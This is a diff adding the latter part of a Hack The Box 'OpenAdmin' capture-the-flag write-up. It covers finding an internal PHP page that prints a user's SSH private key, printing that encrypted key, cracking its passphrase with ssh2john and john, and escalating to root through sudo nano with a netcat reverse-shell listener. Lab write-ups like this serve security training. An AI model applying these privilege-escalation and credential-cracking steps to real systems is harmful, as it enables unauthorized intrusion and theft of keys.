@@ -383,3 +383,304 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-22 17:27:
 - -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login.
 
 Well done! we found a reused password for the user jimmy.
+
+### After enumerating the system to find some way to escalate privileges I found three interesting things.
+
+- I can't access to joanna directory. 
+
+```
+ls -la /home/
+total 16
+drwxr-xr-x  4 root   root   4096 Nov 22  2019 .
+drwxr-xr-x 24 root   root   4096 Aug 17 13:12 ..
+drwxr-x---  5 jimmy  jimmy  4096 Nov 22  2019 jimmy
+drwxr-x---  5 joanna joanna 4096 Jul 27 06:12 joanna
+```
+
+- Checking the services that are listening I see that there is a high port open internally, that's why we couldn't see it in the nmap scan. Searching I didn't find anything specific for this port so I threw a curl to rule out that it is a web server.
+
+```
+curl 127.0.0.1:52846
+
+<body>
+
+      <h2>Enter Username and Password</h2>
+      <div class = "container form-signin">
+        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
+                </div> <!-- /container -->
+
+      <div class = "container">
+
+         <form class = "form-signin" role = "form"
+            action = "/index.php" method = "post">
+            <h4 class = "form-signin-heading"></h4>
+            <input type = "text" class = "form-control"
+               name = "username"
+               required autofocus></br>
+            <input type = "password" class = "form-control"
+               name = "password" required>
+            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
+               name = "login">Login</button>
+         </form>
+
+      </div>
+
+</body>
+```
+
+- We found a potential web service that may be related to port 52846. ./var/www/internal/index.php
+
+```
+jimmy@openadmin:/$ find -type f -user jimmy -ls 2>/dev/null | grep -v "proc" 
+      431      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/tasks
+      441      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
+      442      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
+      440      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
+      430      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/cgroup.clone_children
+      936      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/cgroup.threads
+      961      0 -r--r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.events
+      962      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.max.descendants
+      965      0 -r--r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cpu.stat
+      956      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.type
+      964      0 -r--r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.stat
+      958      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.threads
+      959      0 -r--r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.controllers
+      960      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.subtree_control
+      963      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.max.depth
+      938      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/cgroup.subtree_control
+     3576      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:07 ./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/tasks
+     3578      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:07 ./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/cgroup.clone_children
+     3581      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:07 ./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
+     3582      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:07 ./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
+     3583      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:07 ./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
+   282830      4 -rwxrwxr-x   1 jimmy    internal      339 Nov 23  2019 ./var/www/internal/main.php
+     2644      4 -rwxrwxr-x   1 jimmy    internal      185 Nov 23  2019 ./var/www/internal/logout.php
+     1387      4 -rwxrwxr-x   1 jimmy    internal     3229 Nov 22  2019 ./var/www/internal/index.php
+   394400      4 -rw-------   1 jimmy    jimmy           7 Nov 22  2019 ./home/jimmy/.local/share/nano/search_history
+   394394      4 -rw-r--r--   1 jimmy    jimmy        3771 Apr  4  2018 ./home/jimmy/.bashrc
+   393946      0 -rw-r--r--   1 jimmy    jimmy           0 Nov 21  2019 ./home/jimmy/.cache/motd.legal-displayed
+   394395      4 -rw-r--r--   1 jimmy    jimmy         807 Apr  4  2018 ./home/jimmy/.profile
+   394396      4 -rw-r--r--   1 jimmy    jimmy         220 Apr  4  2018 ./home/jimmy/.bash_logout
+```
+
+# Go to /var/www/internal
+
+```
+jimmy@openadmin:/$ ls -la
+total 20
+drwxrwx--- 2 jimmy internal 4096 Nov 23  2019 .
+drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
+-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
+-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
+-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
+```
+A second web server, let's see what's there.
+
+```
+jimmy@openadmin:/$ cat index.php
+
+<body>
+
+      <h2>Enter Username and Password</h2>
+      <div class = "container form-signin">
+        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
+          <?php
+            $msg = '';
+
+            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
+              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
+                  $_SESSION['username'] = 'jimmy';
+                  header("Location: /main.php");
+              } else {
+                  $msg = 'Wrong username or password.';
+              }
+            }
+         ?>
+      </div> <!-- /container -->
+
+      <div class = "container">
+
+         <form class = "form-signin" role = "form"
+            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
+            ?>" method = "post">
+            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
+            <input type = "text" class = "form-control"
+               name = "username"
+               required autofocus></br>
+            <input type = "password" class = "form-control"
+               name = "password" required>
+            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
+               name = "login">Login</button>
+         </form>
+
+      </div>
+
+   </body>
+```
+
+```
+jimmy@openadmin:/$ cat main.php 
+
+<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
+# Open Admin Trusted
+# OpenAdmin
+$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
+echo "<pre>$output</pre>";
+?>
+<html>
+<h3>Don't forget your "ninja" password</h3>
+Click here to logout <a href="logout.php" tite = "Logout">Session
+</html>
+```
+
+```
+jimmy@openadmin:/$ cat logout.php 
+
+<?php
+   session_start();
+   unset($_SESSION["username"]);
+   unset($_SESSION["password"]);
+   
+   echo 'You have cleaned session';
+   header('Refresh: 2; URL = index.php');
+?>
+```
+
+Apparently it is a page with a login panel that when accessing executes the command cat /home/joanna/.ssh/id_rsa in the following line of the main.php: $output = shell_exec('cat /home/joanna/.ssh/id_rsa') 
+The login validation has the password hashed in sha512 in the same main.php, if we crack it in [CrackStation](https://crackstation.net/) the result is "Revealed". I could do a port forwarding of the port that listens to the web page to show me the id_rsa of joanna, but being in the system as the user jimmy who is the owner, with a curl to the index.php and we could see the id_rsa.
+
+```
+jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/main.php
+
+<pre>
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+</pre><html>
+<h3>Don't forget your "ninja" password</h3>
+Click here to logout <a href="logout.php" tite = "Logout">Session
+</html>
+```
+
+In the line ````Proc-Type: 4,ENCRYPTED`` we see that this id_rsa is password protected, so in my system I will use ssh2john.py to get the password hash and then use john to break it if the password is weak.
+
+```
+root@kali:/# ./ssh2john.py id_rsa > hash-id_rsa
+
+root@kali:/# cat hash-id_rsa
+
+id_rsa:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c03
+0982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a
+10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f
+0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d4096
+3c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416
+cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29
+aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa544
+1aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254a
+df511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0
+567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d1
+4d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f9
+1cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5
+ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2
+fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d
+```
+
+Now let's try to break it with John
+
+```
+root@kali:/# john --wordlist=/usr/share/wordlists/rockyou.txt hash-id_rsa
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 12 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bloodninjas      (id_rsa)
+```
+
+We have the password! set the permissions 600 to the id_rsa so that it does not give us problems when trying to authenticate. We access by ssh specifying the id_rsa with the parameter -i and we enter the password of the same one. The password it asks for is the same id_rsa that we had to break with john, it is not the joanna user's password.
+
+```
+root@kali:/# chmod 600 id_rsa
+
+root@kali:/# ssh -i id_rsa joanna@10.10.10.171
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+```
+
+# Now we are as the user joanna, we enumerate the system to find the way to get the root.
+
+Here's something interesting:
+```
+joanna@openadmin:~$ sudo -l
+Matching Defaults entries for joanna on openadmin:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+```
+
+We have SUID permissions on the nano binary, we can look up how to abuse this binary in [GTFOBins](https://gtfobins.github.io/).
+![](/assets/images/htb-writeup-openadmin/gtfo-nano.png)
+
+
+I'll use the first option
+
+![](/assets/images/htb-writeup-openadmin/gtfo-nano-shell.png)
+
+```
+joanna@openadmin:~$ sudo /bin/nano /opt/priv
+```
+![](/assets/images/htb-writeup-openadmin/nano-exploited.png)
+
+![](/assets/images/htb-writeup-openadmin/send-bash.png)
+
+```
+nc -nlvp 443
+
+listening on [any] 443 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.10.171] 43582
+root@openadmin:/home/joanna# whoami
+whoami
+root
+```
+
+```
+root@openadmin:/# cat /home/joanna/user.txt
+ae16aeddab..
+
+root@openadmin:/# cat /root/root.txt
+b640cba406..
+```
+
+# Thanks for reading! This is my first write-up and day by day I will be improving the new ones.
